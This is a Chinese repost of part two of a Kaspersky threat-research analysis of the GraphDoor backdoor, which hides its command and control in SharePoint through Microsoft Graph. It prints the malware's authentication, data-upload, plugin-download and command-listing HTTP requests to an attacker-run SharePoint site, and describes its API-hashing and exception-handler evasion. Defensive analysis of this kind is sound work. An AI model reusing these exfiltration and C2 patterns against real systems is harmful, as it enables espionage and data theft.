---
title: “ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第二部分
url: https://mp.weixin.qq.com/s/JxsworMKvrCoL95ixFizSA
source: Doonsec's feed
date: 2026-11-18
fetch_date: 2026-11-19T09:44:35.429072
---

# “ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第二部分

# P2“ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第二部分

原创

GReAT
GReAT

网络与信息安全参考

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Oy7lbA08GzYyCf8iaxV9pVHhTIGhTlXRvedPI22qKqVc9iaeQIRHVQQZYibXyXHvjNy6hMicwGibFicFibzqA3UdPZ7Ggsj1lMCaBeH8ryDJUIdw9M/640?wx_fmt=webp&from=appmsg)

— 原文封面图。图片来源：Kaspersky Securelist

GReAT 研究 ｜ 作者：Saurabh Sharma、Noushin Shabab ｜ 2026 年 11 月 17 日 ｜ 原文：Securelist

QUOTE

后门不携带任何 C2 地址，指令被写进 SharePoint 里一份名为 main.xxxx.js.map 的“源码映射文件”。 合法 API 调用混在正常企业流量里 ，云端反倒成了最难识破的跳板。

—— 卡巴斯基 GReAT 团队

本文看点

01

GraphDoor 如何借 Microsoft Graph 收发指令

02

七个插件的能力与内存注入手法

03

与 FamousSparrow、CopperTurtle 的归因交叉

01

OVERVIEW

### 概述

本系列第一篇聚焦初始感染链，剖析了 GitDoor 后门的命令与控制（C2）协议，并梳理了攻击者投放到受害主机的各类 shellcode 家族。本篇将完整走过 GraphDoor 后门及其加载的整套插件——包括经改写的 Erfrp 与 Ably 代理插件——并给出把该行动与 中文语言威胁组织 关联起来的归因线索。

02

GRAPHDOOR

### GraphDoor（MD5 14ec33ea808e697870d00c5e434c2952）

恶意程序的第一步是打开一个命名管道，供后续通信复用。管道名由**自身 PID**拼成，形式为 \\.\pipe\p%lu（其中 %lu 是以无符号长整型表示的进程 ID）。当后门连接上 C2 服务器并下载所需插件后，这些插件会把状态报告写入同一个管道。

管道建立完成后，后门在系统的 Application Data 目录下创建名为 Intel\_Log 的文件夹。在该文件夹内，它再生成一个以随机 GUID 命名的子目录，最终形成类似 C:\ProgramData\Intel\_Log\<random-GUID> 的完整路径。

接下来，恶意程序开始采集系统信息，准备回传给攻击者。它在运行时用 **DJB2 算法**对 DLL 名与函数名做哈希，以此解析所需的 Windows API。为了隐蔽地调用这些 API，后门注册了一个**向量化异常处理程序（vectored exception handler）**，其中内置一段用于目标调用的微型例程，随后故意触发异常；处理程序捕获异常、执行该例程，从而完成对目标 API 的调用。借助这种间接调用技术，恶意程序从受害主机上收集以下信息：

网络适配器详情

操作系统版本

为受感染主机随机生成的 GUID

公网 IP

内网 IP

用户名

主机名

当前目录（后门被执行时所在的位置）

自身模块的 PID

所有正在运行的进程列表

除受害主机信息外，后门还会解密一组内置配置参数（见下方列表），并将其附加到受害数据之后。合并后的信息随后用 AES 加密、Base64 编码，再发送至 C2 服务器。

...conf

"type":"serv"

"client\_version":"1.2.7"

"dhj\_exe":"javaw.exe"

"execution\_method":"normal"

"is\_need\_lock":"false"

恶意程序首先与 login.microsoftonline.com 的 **443 端口**建立 TLS 连接。TLS 握手完成后，它解密三段硬编码的 AES 加密字符串，这些值构成认证请求的各个组成部分：

UUID 路径段

客户端 ID（应用注册）

客户端密钥

它还会生成随机的 X-CSRF-TOKEN，解密一段预置的 User-Agent 字符串以及其他若干硬编码字符串，然后向 login.microsoftonline.com 发起 POST 请求（示例如下）。这次调用认证的对象是恶意应用本身，而非某个用户，返回的访问令牌随后被后门用于与 Microsoft Graph API 通信。

...http

POST /8f50c589-a4d6-4df4-95bb-2fb7f5983fe5/oauth2/v2.0/token HTTP/1.1

Host: login.microsoftonline.com

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %Randomly generated value%

Content-Length: %size of the data%

Content-Type: application/x-www-form-urlencoded

Connection: close

"client\_id=<redacted>&scope=https://graph.microsoft.com/.default&grant\_type=client\_credentials&client\_secret=<redacted>"

若认证成功并取得访问令牌，后门会为 X-CSRF-TOKEN 头重新生成一个随机值，随后连接 graph.microsoft.com。它发出一个 **Microsoft Graph PUT 请求**，在某个 SharePoint 文档库中创建名为 main.%victim-unique-code%.js.map 的文件，伪装成 JavaScript source map 文件。占位符 %victim\_unique\_code% 是随机生成的八位字母数字串。放在 PUT 请求体中的加密受害数据，就存储在该 SharePoint 驱动器的这个文件里。

...http

PUT /v1.0/sites/buildersemp.sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/drives/b!6T\_Ru3F5kUCFtBnhmgLw07MlWGFETDpHjoUHqeJ5AKv5tFfD8L\_sSp8lOvFe6wi\_/root:/main.%victim\_unique\_code%.js.map:/content HTTP/1.1

Host: graph.microsoft.com

Authorization: %Access token received from the previous step%

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %randomly generated string%

Content-Length: %size of the data to be uploaded%

Content-Type: application/json

Connection: close

{"message":"commit from INSOMNIA","content":"%base64-encoded encrypted victim information%"}

上述 PUT 请求的路径可拆解如下：

/sites/：访问 SharePoint 站点

**sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab**：站点标识符；**buildersemp.sharepoint[.]com** 为 SharePoint 域名／网站

/drives/：访问站点内的文档库（drives）

**b!6T\_Ru3F5kUCFtBnhmgLw07MlWGFETDpHjoUHqeJ5AKv5tFfD8L\_sSp8lOvFe6wi\_**：驱动器 ID

**root:/main.%victim\_unique\_code%.js.map:/content**：以动态文件名将文件上传至根目录

随后，恶意程序从服务器上拉取三个插件模块。下表列出了它们存放在 SharePoint 上的对应文件名。

...text

scr.ts: screenshot capturing

pr.ts: process listing

kl.ts: keylogger

对每个插件，恶意程序都会**单独启动一个线程**，使下载过程并行推进、互不阻塞。拉取完成后，插件使用与 GitDoor 变种相同的例程解密。

为了下载截图采集插件，后门构造如下 HTTP GET 请求：

...http

GET /v1.0/sites/buildersemp.sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/lists/dd27e665-bef6-4de1-b28f-280c0af4593f/items?select=id,fields&expand=fields(select=Title,text,Modified,Created)&filter=startswith(fields/Title,'scr.ts') HTTP/1.1

Host: graph.microsoft.com

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

Connection: close

对于键盘记录插件，后门会先检查文件 C:\Users\analyst\AppData\Roaming\log.lock 是否存在。只有在**该文件存在**的情况下，它才会使用下述 GET 请求下载插件：

...http

GET /v1.0/sites/buildersemp.sharepoint[.]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/lists/dd27e665-bef6-4de1-b28f-280c0af4593f/items?select=id,fields&expand=fields(select=Title,text,Modified,Created)&filter=startswith(fields/Title,'kl.ts') HTTP/1.1

Host: graph.microsoft.com

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

Connection: close

下载插件的请求通过 Microsoft Graph API **v1.0** 端点，指向某个 SharePoint 站点上的特定列表。请求中包含若干用于筛选和调整响应结构的参数，具体如下：

buildersemp.sharepoint[.]com：SharePoint 网站

**dd27e665-bef6-4de1-b28f-280c0af4593f**：列表 ID

**$select=id,fields**：仅返回 id 字段与 fields 对象

**select=Title,text,Modified,Created)**：展开 fields 对象，纳入指定列：Title、text、Modified 与 Created

**$filter=startswith(fields/Title,'kl.ts')**：筛选 Title 字段以 “ts”、“scr.ts” 或 “pr.ts” 开头的结果

三个插件模块取回后，恶意程序重新与服务器建立联系以获取指令。它随即发送一个请求（如下所示），列出 SharePoint 网站上针对该受害主机的命令文件。

...http

GET /v1.0/sites/buildersemp.sharepoint[.]com,7700c47b-4999-4cc6-acc5-9a3c7559c34b,66f393a9-0c1a-4d9a-aa2f-27d7293a642d/lists/8c219ab1-58bf-4752-ba7b-a8e7b73bdbb8/items?select=id,fields&expand=fields(select=Title,Modified,Created)&filter=startswith(fields/Title,'main.%unique\_victim\_code%') HTTP/1.1

Connection: Keep-Alive

Content-Type: application/json

Accept: application/json

Authorization: %token%

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: OpB9ZzK4rlfyCGO72mEgBqROv7jr5pUVZ

Host: graph.microsoft.com

上述请求从 SharePoint 列表中检索条目，选取 Title 以 main.%unique\_victim\_code% 开头的文件——也就是发给由 %unique\_victim\_code% 标识的这台受害主机的命令文件。

/lists/：定位站点内的一个列表

**8c219ab1-58bf-4752-ba7b-a8e7b73bdbb8**：待查询列表的 GUID

/items：该列表内的列表项（行）集合

**$select=id,fields**：仅返回每个条目的 id 与 fields 属性

**select=Title,Modified,Created)**：展开 fields 导航属性，使所选子属性出现在响应中，只取 Title、Modified、Created 三列

**$filter=startswith(fields/Title,'main.%unique\_victim\_code%')**：仅保留 Title 列以字面文本 %unique\_victim\_code% 开头的列表项

上述请求的响应是一个由命令文件组成的 JSON 数组，如下所示。后门会将每个文件的扩展名与一份允许清单（.js、.swp、.tmp、.kmap、.pmap、.apmap）逐一比对。一旦命中，它就下载对应的命令文件，并按 GitDoor 变种所述的方式执行其中的命令。

...json

"value": [

{

"@odata.etag": "\"bffa96c9-8ce2-4047-96c7-75f648ce7cec,1\"",

"id": "2145",

"fields@odata.context": "https://graph.microsoft.com/v1.0/$metadata#sites('buildersemp.sharepoint.com%2Cea78ecdb-13c6-471d-977e-9472d8eb3a1c%2C0c4a2edf-cfc5-468e-91f1-4845efbededf')/lists('d23978b8-cb90-4e0b-bcbd-c9347ae1bedb')/items('2145')/fields(Title,Modified,Created)/$entity",

"fields": {

"@odata.etag": "\"bffa96c9-8ce2-4047-96c7-75f648ce7cec,1\"",

"Title": "main.4rSKjLE7.sn35.js",

"Modified": "2026-09-01T09:02:11Z",

"Created": "2026-09-01T09:02:11Z"

}

},...

]

GraphDoor 内置的命令与 GitDoor 变种中的命令大体相同。不过在「**Load Shellcode**」类别下，我们额外识别出两条命令：shell 与 adsmload。

| 命令类型 | 额外支持的命令 |
| --- | --- |
| Load Shellcode | **shell**：以 cmd.exe /C <command\_string> 执行传入的命令。  **adsmload**：与 smload 命令非常相似，区别在于 payload 与可选输入参数会先格式化为 ASCII MAC 地址，再做 Base64 编码...